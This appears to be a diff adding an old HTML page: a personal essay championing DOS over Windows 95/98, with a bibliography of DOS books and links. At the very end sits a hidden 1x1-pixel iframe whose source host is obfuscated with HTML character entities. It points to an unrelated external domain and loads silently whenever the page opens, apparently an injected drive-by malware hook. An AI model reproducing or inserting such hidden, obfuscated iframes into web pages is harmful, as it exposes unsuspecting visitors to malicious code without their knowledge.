+  because they are not Y2K compliant. But I say that DOS programs are simplistic 
+  by nature and can easily be patched to be compatible. Even that seems more sensible 
+  than installing Windows and taking up copious quantities of HD space with utilities 
+  that have a hundred times more features than you'll ever figure out, let alone 
+  use. Don't even get me started on the redundant registry entries and .dll files 
+  that remain after 'removing' shareware and evaluation software on Win95. You 
+  won't get any of that in DOS!</p>
+<p>Win95 and DOS can be compared to bank notes and coin-change respectively. Win95 
+  caters for the multiuser/multitasking system which has convenience similar to 
+  the spending of large bank notes. DOS caters for the single-task user without 
+  the need of extraneous functions and add-ons. Like coins, DOS adds up for too 
+  many individuals not to have a large economic impact if it were removed.</p>
+<p>One of the great 'new features' of Win95 is it's Recycle Bin (thanks Mac!). 
+  But if it's so great, what does a user do if he or she wants to recover a file 
+  after having emptied the bin? Nothing? Tough luck? Nope. DOS to the rescue! 
+  The user simply needs to 'Restart in MS-DOS mode', type in and confirm the LOCK 
+  command, go to the directory where the file was stored (or 'c:\recycled') and 
+  undelete it using DOS v6.2x's old UNDELETE.EXE (remember: restart the computer 
+  or type in UNLOCK to proceed safely). Conclusion: Windows couldn't have been 
+  used to retrieve that 'permenantely' deleted file without using extraneous software 
+  (eg. Norton Utilities).</p>
+<p>Okay, so I've been heavy-handed about my support for DOS over Windows. Sue 
+  me, I like it - it's my 'oldschool'. ;) Although...</p>
+<p>Many people support DOS in that they perceive it to be a magical operating 
+  system that is just perfect for games. Well I have a challenge for them - TRY 
+  PROGRAMMING FOR IT! I'll bet money that half the reason why Interplay's relatively 
+  new game &quot;DTUM&quot; didn't ship with network options was simply because 
+  it is a DOS game and they would have had to do the bulk of the work themselves. 
+  Simply put: if Microsoft wants to write network code for game developers (via 
+  Direct Play) or add support to most if not all sound cards (Direct Sound), a 
+  designer would be foolish not to take advantage of it. Thus guaranteeing MS 
+  role in the games market. Even the mighty Quake(TM) released Windows/OpenGL 
+  versions (sell out? - you decide).</p>
+<p>Two factors determine the user's productivity: how long it takes to tell the 
+  computer to do something, and how long the computer takes to do it. The former 
+  is largely dependent on how you've customized your system with shortcuts, macros, 
+  and AutoLISP routines and the platform is not particularly relevant. The latter 
+  is partly dependent on your choice of platform - any kind of Windows inevitably 
+  suffers compared with DOS. Why? Because DOS remains on a lower user level compared 
+  to Win95 and thus keeps more of the system's resources free.</p>
+<p>Even Windows 98 - the most recent operating system released by Microsoft to 
+  date retains elements of DOS for users - obviously Microsoft recognises the 
+  great need for it. These elements, however, aren't pure DOS. They're part of 
+  Win95/98. A shell (pardon the pun) of its former self if you will. The question 
+  is, will Win98 be able to run without these elements? One of the intriguing 
+  questions being asked today since the discovery that Win95 works with DR-DOS 
+  7.01, is how dependent on DOS is/was Win95? I would have called this myth until 
+  I went to fix a Win95 problem and by accident discovered that Win95 appears 
+  and runs on top of DOS.</p>
+<p>So was it, in fact, essential for Microsoft to retain DOS? Was Win95 already 
+  so intricately (/technically) dependent on DOS that the Win98 upgrade wouldn't 
+  work without it? Probably not, although speculation is widespread.</p>
+<p>I believe that DOS will remain for a few years to come at least. Sentimentality 
+  alone can't keep it around forever though and it's only a matter of time before 
+  somebody finds a way of phasing it out completely. But not without meeting resistance 
+  from individuals for which DOS provides an efficient service. As a DOS junkie, 
+  I find it's faster to type many commands or use batch files than having to click 
+  and move files around in Windows. What can I say? The mouse slows me down and 
+  I think 'user-friendliness' is a sham.</p>
+<p><b><font size="4"><a name="6"></a>Postscript:</font></b></p>
+<p>I know what many of you are thinking and I agree: MS OS's suck, get Linux. 
+  =)</p>
+<p><b><font size="4"><a name="7"></a>Bibliography:</font></b></p>
+<p><b>BOOKS:</b></p>
+<table width="99%" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td>Author(s): </td>
+    <td>Title: </td>
+    <td>Publisher:</td>
+  </tr>
+  <tr>
+    <td>Gookin, Dan </td>
+    <td>DOS for Dummies (3rd Ed)</td>
+    <td>IDG Books International</td>
+  </tr>
+  <tr>
+    <td>Brown, Margaret</td>
+    <td> Learning DOS &amp; Windows </td>
+    <td>DDC Publishing </td>
+  </tr>
+  <tr>
+    <td>Edstrom, Jennifer </td>
+    <td>Barbarians Led by Bill Gates</td>
+    <td> Henry Holt &amp; Company </td>
+  </tr>
+  <tr>
+    <td>Erwin, Robynne</td>
+    <td>User Friendly </td>
+    <td>Wallace Bradely Printers</td>
+  </tr>
+  <tr>
+    <td>Jamsa, Kris A</td>
+    <td>DOS : The Complete Reference </td>
+    <td>Osborne McGraw-Hill</td>
+  </tr>
+</table>
+<p><b>URLS:</b></p>
+<table width="99%" border="0" cellspacing="2" cellpadding="2">
+  <tr>
+    <td><a href="http://members.xoom.com/mhoulden/dosref.htm" target="_blank">http://members.xoom.com/mhoulden/dosref.htm</a></td>
+    <td>Complete DOS reference</td>
+  </tr>
+  <tr>
+    <td><a href="http://www.microtec.net/%7Edlessard/dos.htm" target="_blank">http://www.microtec.net/~dlessard/dos.htm</a></td>
+    <td>DOS history timeline</td>
+  </tr>
+  <tr>
+    <td><a href="http://www.a1computers.net/pcdoshis.htm" target="_blank">http://www.a1computers.net/pcdoshis.htm</a></td>
+    <td>DOS history chart</td>
+  </tr>
+  <tr>
+    <td><a href="http://clarey.com/dosisdead.html" target="_blank">http://clarey.com/dosisdead.html</a></td>
+    <td>DOS is dead forum</td>
+  </tr>
+</table>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
